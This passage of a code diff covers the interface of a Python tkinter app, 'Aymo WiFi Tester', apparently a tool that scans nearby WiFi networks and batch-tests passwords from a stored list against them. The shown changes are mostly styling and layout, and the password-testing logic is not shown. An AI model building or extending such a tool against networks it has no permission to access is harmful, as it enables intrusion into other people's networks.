@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 """
-Aymo WiFi Tester v5 - Fast Edition
-Scans WiFi networks WITHOUT requiring Windows Location services.
-Auto-tests all networks with batch mode.
-Uses only Python standard library (tkinter + subprocess).
+Aymo WiFi Tester v5.1 - Dark Orange Edition
+Simple, working, modern dark UI with orange accents.
 """
 
 import tkinter as tk
@@ -18,103 +16,49 @@ import time
 from pathlib import Path
 from datetime import datetime
 
-# Windows flag to hide console window
 CREATE_NO_WINDOW = 0x08000000 if os.name == 'nt' else 0
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# DESIGN SYSTEM
+# COLORS - Dark + Orange
 # ════════════════════════════════════════════════════════════════════════════
 
-class DesignTokens:
-    BG_APP = "#0a0c12"
-    BG_SECONDARY = "#0f121a"
-    BG_SIDEBAR = "#0f121a"
-    BG_SECONDARY = "#101521"
-    BG_CARD = "#131824"
-    BG_CARD_HOVER = "#1a2030"
-    BG_INPUT = "#0e1118"
-    BG_ACTIVE = "#1e2736"
-
-    ACCENT_PRIMARY = "#4f8cff"
-    ACCENT_PRIMARY_HOVER = "#3a78e0"
-    ACCENT_PRIMARY_PRESS = "#2d5eb8"
-
-    ACCENT_SUCCESS = "#2ecc71"
-    ACCENT_SUCCESS_HOVER = "#27ae60"
-    ACCENT_DANGER = "#ff5c6c"
-    ACCENT_DANGER_HOVER = "#e04e5d"
-    ACCENT_WARNING = "#ffab3d"
-    ACCENT_WARNING_HOVER = "#e8952c"
-    ACCENT_INFO = "#22d3ee"
-    ACCENT_PURPLE = "#a78bfa"
-
-    TEXT_PRIMARY = "#f1f5f9"
-    TEXT_SECONDARY = "#94a3b8"
-    TEXT_MUTED = "#64748b"
-    TEXT_ACCENT = "#4f8cff"
-
-    BORDER = "#1e2532"
-    BORDER_FOCUS = "#4f8cff"
-
-    FONT_FAMILY = "Segoe UI"
-    FONT_MONO = "Consolas"
-
-
-class ColorUtils:
-    @staticmethod
-    def hex_to_rgb(hex_color):
-        hex_color = hex_color.lstrip("#")
-        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
-
-    @staticmethod
-    def rgb_to_hex(r, g, b):
-        return f"#{r:02x}{g:02x}{b:02x}"
-
-    @staticmethod
-    def lerp_color(color1, color2, factor):
-        r1, g1, b1 = ColorUtils.hex_to_rgb(color1)
-        r2, g2, b2 = ColorUtils.hex_to_rgb(color2)
-        r = int(r1 + (r2 - r1) * factor)
-        g = int(g1 + (g2 - g1) * factor)
-        b = int(b1 + (b2 - b1) * factor)
-        return ColorUtils.rgb_to_hex(r, g, b)
+C = {
+    "bg":         "#0a0a0a",   # App background (near black)
+    "card":       "#141414",   # Card background
+    "card_hover": "#1e1e1e",   # Card hover
+    "input":      "#0d0d0d",   # Input background
+    "border":     "#2a2a2a",   # Subtle border
+    "border_focus": "#ff8c00", # Orange focus
+    "orange":     "#ff8c00",   # Primary orange
+    "orange_hover": "#e07b00",
+    "orange_press": "#c66f00",
+    "success":    "#00ff88",   # Green
+    "danger":     "#ff4444",   # Red
+    "warning":    "#ffaa00",   # Amber
+    "text":       "#ffffff",   # Primary text
+    "text_second": "#b0b0b0",  # Secondary text
+    "text_muted": "#666666",   # Muted text
+    "font":       "Segoe UI",
+    "mono":       "Consolas",
+}
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# UI COMPONENTS
+# BUTTON - Simple, centered, animated
 # ════════════════════════════════════════════════════════════════════════════
-
-class GlassCard(tk.Frame):
-    def __init__(self, parent, padding=16, **kwargs):
-        super().__init__(
-            parent,
-            bg=DesignTokens.BG_CARD,
-            highlightbackground=DesignTokens.BORDER,
-            highlightthickness=1,
-            highlightcolor=DesignTokens.BORDER_FOCUS,
-            **kwargs
-        )
-        self.configure(padx=padding, pady=padding)
-
 
 class ModernButton(tk.Canvas):
     def __init__(self, parent, text, command=None, icon="",
-                 bg=DesignTokens.ACCENT_PRIMARY,
-                 hover=None, press=None, fg="#ffffff",
-                 width=200, height=44, radius=10,
-                 font_size=11, font_weight="bold",
-                 state=tk.NORMAL, **kwargs):
-        hover = hover or ColorUtils.lerp_color(bg, "#000000", 0.15)
-        press = press or ColorUtils.lerp_color(bg, "#000000", 0.30)
+                 bg=C["orange"], hover=None, press=None, fg="#ffffff",
+                 width=200, height=44, radius=10, font_size=11, **kwargs):
+        hover = hover or C["orange_hover"]
+        press = press or C["orange_press"]
 
         super().__init__(
             parent, width=width, height=height,
-            highlightthickness=0,
-            bg=parent.cget("background") if hasattr(parent, 'cget') else DesignTokens.BG_APP,
-            **kwargs
+            highlightthickness=0, bg=parent.cget("bg"), **kwargs
         )
-
         self.command = command
         self.text = text
         self.icon = icon
@@ -126,16 +70,14 @@ class ModernButton(tk.Canvas):
         self.width_val = width
         self.height_val = height
         self.font_size = font_size
-        self.font_weight = font_weight
-        self.state = "normal"
-        self.enabled = state == tk.NORMAL
-        self.current_color = bg if self.enabled else DesignTokens.TEXT_MUTED
-        self.target_color = self.current_color
+        self.enabled = True
+        self.current_color = bg
+        self.target_color = bg
 
-        self.bind("<Enter>", self._on_enter)
-        self.bind("<Leave>", self._on_leave)
-        self.bind("<Button-1>", self._on_press)
-        self.bind("<ButtonRelease-1>", self._on_release)
+        self.bind("<Enter>", self._enter)
+        self.bind("<Leave>", self._leave)
+        self.bind("<Button-1>", self._press)
+        self.bind("<ButtonRelease-1>", self._release)
 
         self.draw()
         self._animate()
@@ -145,93 +87,74 @@ class ModernButton(tk.Canvas):
         w = self.winfo_width() or self.width_val
         h = self.winfo_height() or self.height_val
         r = min(self.radius, w // 2, h // 2)
+        col = self.current_color if self.enabled else C["text_muted"]
 
-        self._draw_rounded_rect(0, 0, w, h, r, fill=self.current_color, outline="")
-
-        if self.icon or self.text:
-            display_text = f"{self.icon}  {self.text}" if self.icon and self.text else (self.icon or self.text)
-            self.create_text(
-                w // 2, h // 2,
-                text=display_text,
-                fill=self.fg_color if self.enabled else DesignTokens.TEXT_MUTED,
-                font=(DesignTokens.FONT_FAMILY, self.font_size, self.font_weight),
-                anchor=tk.CENTER
-            )
-
-    def _draw_rounded_rect(self, x1, y1, x2, y2, r, **kwargs):
-        points = [
-            x1 + r, y1, x2 - r, y1, x2, y1,
-            x2, y1 + r, x2, y2 - r, x2, y2,
-            x2 - r, y2, x1 + r, y2, x1, y2,
-            x1, y2 - r, x1, y1 + r, x1, y1
+        # Rounded rect
+        pts = [
+            r, 0, w - r, 0, w, 0, w, r, w, h - r, w, h,
+            w - r, h, r, h, 0, h, 0, h - r, 0, r, 0, 0
         ]
-        return self.create_polygon(points, smooth=True, **kwargs)
+        self.create_polygon(pts, smooth=True, fill=col, outline="")
 
-    def _on_enter(self, e):
-        if not self.enabled:
-            return
-        self.state = "hover"
-        self.target_color = self.hover_color
-        self.config(cursor="hand2")
+        # Icon + text centered
+        disp = f"{self.icon}  {self.text}" if self.icon and self.text else (self.icon or self.text)
+        self.create_text(
+            w // 2, h // 2, text=disp, fill=self.fg_color if self.enabled else C["text_muted"],
+            font=(C["font"], self.font_size, "bold"), anchor=tk.CENTER
+        )
 
-    def _on_leave(self, e):
-        if not self.enabled:
-            return
-        self.state = "normal"
-        self.target_color = self.bg_color if self.enabled else DesignTokens.TEXT_MUTED
-        self.config(cursor="")
+    def _enter(self, e):
+        if self.enabled:
+            self.target_color = self.hover_color
+            self.config(cursor="hand2")
 
-    def _on_press(self, e):
-        if not self.enabled:
-            return
-        self.state = "press"
-        self.target_color = self.press_color
+    def _leave(self, e):
+        if self.enabled:
+            self.target_color = self.bg_color
+            self.config(cursor="")
 
-    def _on_release(self, e):
-        if not self.enabled:
-            return
-        if self.state == "press":
-            self.state = "hover"
+    def _press(self, e):
+        if self.enabled:
+            self.target_color = self.press_color
+
+    def _release(self, e):
+        if self.enabled:
             self.target_color = self.hover_color
             if self.command:
                 self.command()
 
     def _animate(self):
         if self.current_color != self.target_color:
-            c1 = ColorUtils.hex_to_rgb(self.current_color)
-            c2 = ColorUtils.hex_to_rgb(self.target_color)
-            diff = max(abs(c1[i] - c2[i]) for i in range(3))
-            if diff < 2:
-                self.current_color = self.target_color
-            else:
-                step = 0.3
-                r = int(c1[0] + (c2[0] - c1[0]) * step)
-                g = int(c1[1] + (c2[1] - c1[1]) * step)
-                b = int(c1[2] + (c2[2] - c1[2]) * step)
-                self.current_color = ColorUtils.rgb_to_hex(r, g, b)
+            c1 = self._hex(self.current_color)
+            c2 = self._hex(self.target_color)
+            step = 0.3
+            r = int(c1[0] + (c2[0] - c1[0]) * step)
+            g = int(c1[1] + (c2[1] - c1[1]) * step)
+            b = int(c1[2] + (c2[2] - c1[2]) * step)
+            self.current_color = f"#{r:02x}{g:02x}{b:02x}"
             self.draw()
         self.after(16, self._animate)
 
+    def _hex(self, h):
+        h = h.lstrip("#")
+        return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))
+
     def set_enabled(self, enabled):
         self.enabled = enabled
-        if enabled:
-            self.state = "normal"
-            self.target_color = self.bg_color
-            self.current_color = self.bg_color
-        else:
-            self.state = "disabled"
-            self.target_color = DesignTokens.TEXT_MUTED
-            self.current_color = DesignTokens.TEXT_MUTED
+        self.target_color = self.bg_color if enabled else C["text_muted"]
+        self.current_color = self.target_color
         self.draw()
 
 
+# ════════════════════════════════════════════════════════════════════════════
+# PULSE RING
+# ════════════════════════════════════════════════════════════════════════════
+
 class PulseRing(tk.Canvas):
-    def __init__(self, parent, color=DesignTokens.ACCENT_PRIMARY, size=24, **kwargs):
+    def __init__(self, parent, color=C["orange"], size=20, **kwargs):
         super().__init__(
             parent, width=size, height=size,
-            highlightthickness=0,
-            bg=parent.cget("background") if hasattr(parent, 'cget') else DesignTokens.BG_APP,
-            **kwargs
+            highlightthickness=0, bg=parent.cget("bg"), **kwargs
         )
         self.color = color
         self.size = size
@@ -249,1003 +172,852 @@ class PulseRing(tk.Canvas):
     def animate(self):
         self.delete("all")
         if self.active:
-            self.radius = (self.radius + 2) % 28
+            self.radius = (self.radius + 2) % 30
             for i in range(3):
-                r = (self.radius + i * 9) % 28
-                a = max(0, 1.0 - (r / 28))
+                r = (self.radius + i * 10) % 30
+                a = max(0, 1 - r / 30)
                 if a > 0:
                     x = self.size // 2
                     y = self.size // 2
                     intensity = int(255 * a * 0.7)
-                    r_col = int(intensity * (int(self.color[1:3], 16) / 255))
-                    g_col = int(intensity * (int(self.color[3:5], 16) / 255))
-                    b_col = int(intensity * (int(self.color[5:7], 16) / 255))
-                    ring_color = f"#{r_col:02x}{g_col:02x}{b_col:02x}"
-                    self.create_oval(x - r, y - r, x + r, y + r, outline=ring_color, width=2)
+                    rc = int(intensity * (int(self.color[1:3], 16) / 255))
+                    gc = int(intensity * (int(self.color[3:5], 16) / 255))
+                    bc = int(intensity * (int(self.color[5:7], 16) / 255))
+                    col = f"#{rc:02x}{gc:02x}{bc:02x}"
+                    self.create_oval(x - r, y - r, x + r, y + r, outline=col, width=2)
         self.after(50, self.animate)
 
 
-class ToastNotification(tk.Toplevel):
-    def __init__(self, parent, message, type_="info", duration=3000):
-        super().__init__(parent)
-        self.overrideredirect(True)
-        self.attributes("-topmost", True)
-        self.attributes("-alpha", 0.0)
-
-        colors = {
-            "info": DesignTokens.ACCENT_INFO,
-            "success": DesignTokens.ACCENT_SUCCESS,
-            "warning": DesignTokens.ACCENT_WARNING,
-            "error": DesignTokens.ACCENT_DANGER,
-        }
-        bg_color = colors.get(type_, DesignTokens.ACCENT_PRIMARY)
-
-        self.update_idletasks()
-        screen_w = self.winfo_screenwidth()
-        screen_h = self.winfo_screenheight()
-        w, h = 300, 60
-        x = screen_w - w - 20
-        y = screen_h - h - 100
-        self.geometry(f"{w}x{h}+{x}+{y}")
-
-        card = GlassCard(self, padding=12)
-        card.pack(fill=tk.BOTH, expand=True)
-
-        icons = {"info": "ℹ", "success": "✓", "warning": "⚠", "error": "✕"}
-        tk.Label(card, text=icons.get(type_, "ℹ"),
-                font=(DesignTokens.FONT_FAMILY, 14, "bold"),
-                fg=bg_color, bg=DesignTokens.BG_CARD).pack(side=tk.LEFT, padx=(0, 10))
-
-        tk.Label(card, text=message,
-                font=(DesignTokens.FONT_FAMILY, 10),
-                fg=DesignTokens.TEXT_PRIMARY, bg=DesignTokens.BG_CARD,
-                wraplength=220, justify=tk.LEFT).pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-
-        self._fade_in(0)
-        self.after(duration, self._fade_out)
-
-    def _fade_in(self, alpha):
-        if alpha < 1.0:
-            alpha += 0.1
-            self.attributes("-alpha", alpha)
-            self.after(16, lambda: self._fade_in(alpha))
-
-    def _fade_out(self):
-        alpha = self.attributes("-alpha")
-        if alpha > 0:
-            alpha -= 0.1
-            self.attributes("-alpha", alpha)
-            self.after(16, self._fade_out)
-        else:
-            self.destroy()
-
-
 # ════════════════════════════════════════════════════════════════════════════
-# MAIN APPLICATION v5
+# MAIN APP
 # ════════════════════════════════════════════════════════════════════════════
 
-class AymoWiFiTesterV5:
+class AymoWiFiTester:
     def __init__(self, root):
         self.root = root
-        self.root.title("Aymo WiFi Tester v5 - Fast Edition")
-        self.root.geometry("1200x750")
-        self.root.minsize(1000, 650)
-        self.root.configure(bg=DesignTokens.BG_APP)
+        self.root.title("Aymo WiFi Tester v5.1")
+        self.root.geometry("1100x700")
+        self.root.minsize(950, 600)
+        self.root.configure(bg=C["bg"])
 
-        self.is_admin = self.check_admin()
+        self.is_admin = self._check_admin()
         self.db_path = Path.home() / ".aymo_wifi_db_v5.json"
 
-        self.password_db = self.load_password_db()
+        self.password_db = self._load_db()
         self.scanning = False
         self.testing = False
         self.auto_testing = False
         self.current_network = None
-        self.selected_networks = set()  # SSIDs selected for batch test
-        self.network_items = {}  # ssid -> tree item id
+        self.selected_networks = set()
+        self.network_items = {}
+        self.auto_queue = []
+        self.auto_index = 0
 
-        self.log_text = None
-        self.network_tree = None
-        self.password_listbox = None
-        self.status_var = None
-        self.scan_btn = None
-        self.test_btn = None
-        self.auto_btn = None
-        self.stop_btn = None
-        self.select_all_btn = None
-        self.pulse_indicator = None
-        self.admin_badge = None
-
-        self.setup_ui()
+        self._build_ui()
 
         if not self.password_db:
-            self.root.after(100, self.load_sample_passwords)
+            self.root.after(100, self._load_sample)
 
-        self.root.after(500, self.refresh_networks)
+        self.root.after(500, self._scan)
 
     # ------------------------------------------------------------------
     # Helpers
     # ------------------------------------------------------------------
-    def check_admin(self):
+    def _check_admin(self):
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
         except:
             return False
 
-    def toast(self, message, type_="info", duration=3000):
-        ToastNotification(self.root, message, type_, duration)
-
-    def log(self, message, level="info"):
-        if not self.log_text:
+    def _log(self, msg, level="info"):
+        if not hasattr(self, "log_text") or self.log_text is None:
             return
-        timestamp = datetime.now().strftime("%H:%M:%S")
+        ts = datetime.now().strftime("%H:%M:%S")
         self.log_text.config(state=tk.NORMAL)
-        self.log_text.insert(tk.END, f"[{timestamp}] ", "timestamp")
-        self.log_text.insert(tk.END, f"{message}\n", level)
+        self.log_text.insert(tk.END, f"[{ts}] ", "ts")
+        self.log_text.insert(tk.END, f"{msg}\n", level)
         self.log_text.see(tk.END)
         self.log_text.config(state=tk.DISABLED)
 
-    # ------------------------------------------------------------------
-    # UI Setup
-    # ------------------------------------------------------------------
-    def setup_ui(self):
-        root_container = tk.Frame(self.root, bg=DesignTokens.BG_APP)
-        root_container.pack(fill=tk.BOTH, expand=True)
+    def _toast(self, msg, type_="info", duration=2500):
+        colors = {"info": C["orange"], "success": C["success"],
+                  "warning": C["warning"], "error": C["danger"]}
+        bg = colors.get(type_, C["orange"])
 
-        # ═════════════════════════════════════════════════════════════════════
-        # SIDEBAR
-        # ═════════════════════════════════════════════════════════════════════
-        sidebar = tk.Frame(root_container, bg=DesignTokens.BG_SIDEBAR, width=260)
+        win = tk.Toplevel(self.root)
+        win.overrideredirect(True)
+        win.attributes("-topmost", True)
+        win.attributes("-alpha", 0.0)
+
+        win.update_idletasks()
+        sw = win.winfo_screenwidth()
+        sh = win.winfo_screenheight()
+        w, h = 280, 55
+        x = sw - w - 20
+        y = sh - h - 100
+        win.geometry(f"{w}x{h}+{x}+{y}")
+
+        card = tk.Frame(win, bg=C["card"], highlightbackground=C["border_focus"],
+                       highlightthickness=1)
+        card.pack(fill=tk.BOTH, expand=True)
+
+        icons = {"info": "ℹ", "success": "✓", "warning": "⚠", "error": "✕"}
+        tk.Label(card, text=icons.get(type_, "ℹ"), font=(C["font"], 13, "bold"),
+                fg=bg, bg=C["card"]).pack(side=tk.LEFT, padx=(10, 8), pady=10)
+        tk.Label(card, text=msg, font=(C["font"], 10), fg=C["text"],
+                bg=C["card"], wraplength=180, justify=tk.LEFT).pack(
+                side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10), pady=10)
+
+        alpha = 0.0
+        def fade_in(a):
+            nonlocal alpha
+            alpha = a
+            if alpha < 1.0:
+                alpha += 0.1
+                win.attributes("-alpha", alpha)
+                win.after(16, lambda: fade_in(alpha))
+        fade_in(0)
+        win.after(duration, lambda: self._fade_out(win, 1.0))
+
+    def _fade_out(self, win, alpha):
+        if alpha > 0:
+            alpha -= 0.1
+            win.attributes("-alpha", alpha)
+            win.after(16, lambda: self._fade_out(win, alpha))
+        else:
+            win.destroy()
+
+    # ------------------------------------------------------------------
+    # UI
+    # ------------------------------------------------------------------
+    def _build_ui(self):
+        # Sidebar
+        sidebar = tk.Frame(self.root, bg=C["card"], width=230)
         sidebar.pack(side=tk.LEFT, fill=tk.Y)
         sidebar.pack_propagate(False)
 
-        logo_frame = tk.Frame(sidebar, bg=DesignTokens.BG_SIDEBAR)
-        logo_frame.pack(fill=tk.X, pady=(20, 12))
+        # Logo
+        logo = tk.Frame(sidebar, bg=C["card"])
+        logo.pack(fill=tk.X, pady=(24, 16), padx=16)
+        lc = tk.Canvas(logo, width=36, height=36, highlightthickness=0, bg=C["card"])
+        lc.pack(side=tk.LEFT, padx=(0, 10))
+        self._draw_wifi(lc, C["orange"])
+        tk.Label(logo, text="AYMO", font=(C["font"], 15, "bold"),
+                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)
 
-        logo_canvas = tk.Canvas(logo_frame, width=40, height=40,
-                               highlightthickness=0, bg=DesignTokens.BG_SIDEBAR)
-        logo_canvas.pack(side=tk.LEFT, padx=(16, 0))
-        self._draw_wifi_logo(logo_canvas, DesignTokens.ACCENT_PRIMARY)
+        tk.Label(sidebar, text="WiFi Tester v5.1", font=(C["font"], 8),
+                fg=C["text_muted"], bg=C["card"]).pack(
+                anchor="w", padx=16, pady=(0, 20))
 
-        tk.Label(logo_frame, text="AYMO", font=(DesignTokens.FONT_FAMILY, 16, "bold"),
-                fg=DesignTokens.TEXT_PRIMARY, bg=DesignTokens.BG_SIDEBAR).pack(side=tk.LEFT, padx=(8, 0))
+        tk.Frame(sidebar, bg=C["border"], height=1).pack(
+            fill=tk.X, padx=16, pady=(0, 16))
 
-        tk.Label(sidebar, text="WiFi Tester v5", font=(DesignTokens.FONT_FAMILY, 8),
-                fg=DesignTokens.TEXT_MUTED, bg=DesignTokens.BG_SIDEBAR).pack(
-                anchor="w", padx=16, pady=(0, 16))
-
-        tk.Frame(sidebar, bg=DesignTokens.BORDER, height=1).pack(
-            fill=tk.X, padx=16, pady=(0, 12))
-
-        nav_items = [
-            ("📡", "Scan Networks", "scan"),
-            ("🔓", "Auto Test All", "autotest"),
-            ("📝", "Password DB", "passwords"),
-            ("📋", "Activity Log", "log"),
-            ("⚙️", "Settings", "settings"),
+        nav = [
+            ("📡", "Scan", "scan"),
+            ("🚀", "Auto Test All", "auto"),
+            ("📝", "Passwords", "pass"),
+            ("📋", "Log", "log"),
+            ("⚙️", "Settings", "set"),
         ]
+        self.nav_btns = {}
+        for icon, label, key in nav:
+            b = self._nav_item(sidebar, icon, label, key)
+            b.pack(fill=tk.X, padx=6, pady=2)
+            self.nav_btns[key] = b
 
-        self.nav_buttons = {}
-        for icon, label, key in nav_items:
-            btn = self._create_nav_item(sidebar, icon, label, key)
-            btn.pack(fill=tk.X, padx=6, pady=2)
-            self.nav_buttons[key] = btn
+        tk.Frame(sidebar, bg=C["bg"]).pack(fill=tk.BOTH, expand=True)
 
-        tk.Frame(sidebar, bg=DesignTokens.BG_SIDEBAR).pack(fill=tk.BOTH, expand=True)
+        # Admin footer
+        af = tk.Frame(sidebar, bg=C["card"])
+        af.pack(side=tk.BOTTOM, fill=tk.X, padx=16, pady=16)
+        col = C["success"] if self.is_admin else C["warning"]
+        dot = tk.Canvas(af, width=8, height=8, highlightthickness=0, bg=C["card"])
+        dot.pack(side=tk.LEFT, padx=(0, 6))
+        dot.create_oval(0, 0, 8, 8, fill=col, outline="")
+        tk.Label(af, text="ADMIN" if self.is_admin else "USER",
+                font=(C["font"], 9, "bold"), fg=col, bg=C["card"]).pack(side=tk.LEFT)
 
-        admin_frame = tk.Frame(sidebar, bg=DesignTokens.BG_SIDEBAR)
-        admin_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=16, pady=16)
-
-        admin_color = DesignTokens.ACCENT_SUCCESS if self.is_admin else DesignTokens.ACCENT_WARNING
-        admin_text = "ADMIN" if self.is_admin else "USER"
-
-        admin_dot = tk.Canvas(admin_frame, width=8, height=8,
-                             highlightthickness=0, bg=DesignTokens.BG_SIDEBAR)
-        admin_dot.pack(side=tk.LEFT, padx=(0, 6))
-        admin_dot.create_oval(0, 0, 8, 8, fill=admin_color, outline="")
-
-        tk.Label(admin_frame, text=admin_text,
-                font=(DesignTokens.FONT_FAMILY, 9, "bold"),
-                fg=admin_color, bg=DesignTokens.BG_SIDEBAR).pack(side=tk.LEFT)
-
-        # ═════════════════════════════════════════════════════════════════════
-        # MAIN CONTENT
-        # ═════════════════════════════════════════════════════════════════════
-        content = tk.Frame(root_container, bg=DesignTokens.BG_APP)
+        # Main content
+        content = tk.Frame(self.root, bg=C["bg"])
         content.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
 
-        header = tk.Frame(content, bg=DesignTokens.BG_APP, height=60)
+        # Header
+        header = tk.Frame(content, bg=C["bg"], height=64)
         header.pack(fill=tk.X, padx=20, pady=(16, 0))
         header.pack_propagate(False)
-
         tk.Label(header, text="Network Scanner",
-                font=(DesignTokens.FONT_FAMILY, 18, "bold"),
-                fg=DesignTokens.TEXT_PRIMARY, bg=DesignTokens.BG_APP,
-                anchor="w").pack(side=tk.LEFT, anchor="w")
+                font=(C["font"], 18, "bold"), fg=C["text"],
+                bg=C["bg"], anchor="w").pack(side=tk.LEFT, anchor="w")
 
-        header_right = tk.Frame(header, bg=DesignTokens.BG_APP)
-        header_right.pack(side=tk.RIGHT, anchor="e")
-
-        self.admin_badge = self._status_badge(
-            header_right,
-            "● ADMIN" if self.is_admin else "● USER",
-            DesignTokens.ACCENT_SUCCESS if self.is_admin else DesignTokens.ACCENT_WARNING
-        )
+        hr = tk.Frame(header, bg=C["bg"])
+        hr.pack(side=tk.RIGHT, anchor="e")
+        self.admin_badge = self._pill(hr, "● ADMIN" if self.is_admin else "● USER",
+                                     C["success"] if self.is_admin else C["warning"])
         self.admin_badge.pack(side=tk.LEFT, padx=(0, 12))
 
-        # ═════════════════════════════════════════════════════════════════════
-        # CONTENT AREA
-        # ═════════════════════════════════════════════════════════════════════
-        main_scroll = tk.Frame(content, bg=DesignTokens.BG_APP)
-        main_scroll.pack(fill=tk.BOTH, expand=True, padx=20, pady=16)
+        # Body
+        body = tk.Frame(content, bg=C["bg"])
+        body.pack(fill=tk.BOTH, expand=True, padx=20, pady=16)
 
-        # Left column - Networks
-        left_col = GlassCard(main_scroll, padding=0)
-        left_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 12))
+        # LEFT: Networks
+        left = tk.Frame(body, bg=C["card"], highlightbackground=C["border"],
+                       highlightthickness=1)
+        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
 
-        left_header = tk.Frame(left_col, bg=DesignTokens.BG_CARD)
-        left_header.pack(fill=tk.X, padx=16, pady=(16, 12))
+        lh = tk.Frame(left, bg=C["card"])
+        lh.pack(fill=tk.X, padx=16, pady=(16, 10))
+        tk.Label(lh, text="Available Networks", font=(C["font"], 13, "bold"),
+                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)
 
-        tk.Label(left_header, text="Available Networks",
-                font=(DesignTokens.FONT_FAMILY, 13, "bold"),
-                fg=DesignTokens.TEXT_PRIMARY, bg=DesignTokens.BG_CARD).pack(side=tk.LEFT)
-
-        self.refresh_modern_btn = ModernButton(
-            left_header, "Refresh", command=self.refresh_networks,
-            icon="🔄", bg=DesignTokens.ACCENT_PRIMARY,
-            width=110, height=32, radius=6, font_size=10
+        self.scan_btn = ModernButton(
+            lh, "SCAN", command=self._scan, icon="🔄",
+            bg=C["orange"], width=110, height=34, radius=6, font_size=10
         )
-        self.refresh_modern_btn.pack(side=tk.RIGHT)
+        self.scan_btn.pack(side=tk.RIGHT)
 
-        # Select All checkbox
-        self.select_all_var = tk.BooleanVar(value=False)
-        select_all_cb = tk.Checkbutton(
-            left_header, text="Select All",
-            variable=self.select_all_var,
-            command=self.toggle_select_all,
-            bg=DesignTokens.BG_CARD, fg=DesignTokens.TEXT_SECONDARY,
-            selectcolor=DesignTokens.BG_INPUT,
-            activebackground=DesignTokens.BG_CARD,
-            activeforeground=DesignTokens.TEXT_PRIMARY,
-            font=(DesignTokens.FONT_FAMILY, 9),
-            highlightthickness=0, bd=0
-        )
-        select_all_cb.pack(side=tk.RIGHT, padx=(0, 12))
+        # Tree
+        tc = tk.Frame(left, bg=C["card"])
+        tc.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 16))
 
-        tree_container = tk.Frame(left_col, bg=DesignTokens.BG_CARD)
-        tree_container.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 16))
-
-        columns = ("select", "ssid", "signal", "auth", "status")
-        self.network_tree = ttk.Treeview(
-            tree_container, columns=columns, show="headings", height=14
-        )
-
-        self.network_tree.heading("select", text="✓")
-        self.network_tree.heading("ssid", text="Network Name")
-        self.network_tree.heading("signal", text="Signal")
-        self.network_tree.heading("auth", text="Security")
-        self.network_tree.heading("status", text="Status")
-
-        self.network_tree.column("select", width=40, minwidth=40, anchor="center")
-        self.network_tree.column("ssid", width=200, minwidth=150)
-        self.network_tree.column("signal", width=100, minwidth=80, anchor="center")
-        self.network_tree.column("auth", width=110, minwidth=100, anchor="center")
-        self.network_tree.column("status", width=110, minwidth=100, anchor="center")
+        cols = ("sel", "ssid", "signal", "auth", "status")
+        self.tree = ttk.Treeview(tc, columns=cols, show="headings", height=13)
+        self.tree.heading("sel", text="✓")
+        self.tree.heading("ssid", text="Network Name")
+        self.tree.heading("signal", text="Signal")
+        self.tree.heading("auth", text="Security")
+        self.tree.heading("status", text="Status")
+        self.tree.column("sel", width=36, minwidth=36, anchor="center")
+        self.tree.column("ssid", width=190, minwidth=140)
+        self.tree.column("signal", width=90, minwidth=70, anchor="center")
+        self.tree.column("auth", width=100, minwidth=80, anchor="center")
+        self.tree.column("status", width=100, minwidth=80, anchor="center")
 
         style = ttk.Style()
         style.theme_use("clam")
-        style.configure(
-            "Modern.Treeview",
-            background=DesignTokens.BG_INPUT,
-            foreground=DesignTokens.TEXT_PRIMARY,
-            fieldbackground=DesignTokens.BG_INPUT,
-            borderwidth=0,
-            font=(DesignTokens.FONT_FAMILY, 9),
-            rowheight=34
-        )
-        style.configure(
-            "Modern.Treeview.Heading",
-            background=DesignTokens.BG_SECONDARY,
-            foreground=DesignTokens.TEXT_SECONDARY,
-            borderwidth=0,
-            font=(DesignTokens.FONT_FAMILY, 9, "bold")
-        )
-        style.map(
-            "Modern.Treeview",
-            background=[("selected", DesignTokens.ACCENT_PRIMARY)],
-            foreground=[("selected", "#ffffff")]
-        )
-        self.network_tree.configure(style="Modern.Treeview")
+        style.configure("Treeview", background=C["input"], foreground=C["text"],
+                       fieldbackground=C["input"], borderwidth=0,
+                       font=(C["font"], 9), rowheight=32)
+        style.configure("Treeview.Heading", background=C["card"],
+                       foreground=C["text_second"], borderwidth=0,
+                       font=(C["font"], 9, "bold"))
+        style.map("Treeview", background=[("selected", C["orange"])],
+                 foreground=[("selected", "#ffffff")])
+        self.tree.configure(style="Treeview")
 
-        vsb = ttk.Scrollbar(tree_container, orient="vertical", command=self.network_tree.yview)
-        self.network_tree.configure(yscrollcommand=vsb.set)
-
-        self.network_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        vsb = ttk.Scrollbar(tc, orient="vertical", command=self.tree.yview)
+        self.tree.configure(yscrollcommand=vsb.set)
+        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
         vsb.pack(side=tk.RIGHT, fill=tk.Y)
 
-        self.network_tree.bind("<<TreeviewSelect>>", self.on_network_select)
-        self.network_tree.bind("<Button-1>", self.on_tree_click)
+        self.tree.bind("<<TreeviewSelect>>", self._on_select)
+        self.tree.bind("<Button-1>", self._on_tree_click)
 
-        net_actions = tk.Frame(left_col, bg=DesignTokens.BG_CARD)
-        net_actions.pack(fill=tk.X, padx=16, pady=(0, 16))
+        # Action buttons centered
+        ab = tk.Frame(left, bg=C["card"])
+        ab.pack(fill=tk.X, padx=16, pady=(0, 16))
 
         self.test_btn = ModernButton(
-            net_actions, "Test Selected",
-            command=self.start_testing,
-            icon="🔓", bg=DesignTokens.ACCENT_SUCCESS,
-            width=140, height=40, radius=8, font_size=11
+            ab, "Test Selected", command=self._test_single,
+            icon="🔓", bg=C["success"], width=130, height=38, radius=7, font_size=10
         )
         self.test_btn.pack(side=tk.LEFT, padx=(0, 8))
 
         self.auto_btn = ModernButton(
